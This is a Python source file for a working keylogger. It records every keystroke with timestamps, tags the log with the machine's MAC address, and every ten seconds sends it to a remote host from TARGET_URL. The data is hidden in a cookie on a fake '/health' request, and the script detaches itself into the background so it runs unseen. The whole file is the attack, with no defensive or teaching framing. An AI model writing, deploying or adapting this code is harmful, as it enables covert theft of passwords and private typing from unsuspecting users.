import os
import subprocess
import sys
import threading
from datetime import datetime

import requests
from dotenv import load_dotenv
from getmac import get_mac_address
from pynput.keyboard import Key, KeyCode, Listener
from utils import set_interval

mac_address = get_mac_address()

load_dotenv()


def gen_default_obj():
    return {
        "id": mac_address,
        "data": [],
    }


obj = gen_default_obj()


def on_press(key: Key | KeyCode):
    if isinstance(key, KeyCode):
        key_str = key.char
    else:
        key_str = str(key)

    obj["data"].append({"key": key_str, "when": datetime.now().isoformat()})


def action():
    global obj

    requests.get(
        f"{os.environ['TARGET_URL']}/health",
        cookies={"X-App-Data": str(obj)},
        timeout=5,
    )

    obj = gen_default_obj()


def start_listener():
    with Listener(on_press=on_press) as listener:
        listener.join()


def main():
    threading.Thread(target=start_listener).start()

    set_interval(action, 1 * 10)


if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "background":
        main()
    else:
        if sys.platform == "win32":
            subprocess.Popen(
                [sys.executable, "main.py", "background"],
                creationflags=subprocess.DETACHED_PROCESS,
            )
            sys.exit()
        else:
            subprocess.Popen(
                [sys.executable, "main.py", "background"],
                close_fds=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            if os.fork():
                sys.exit()
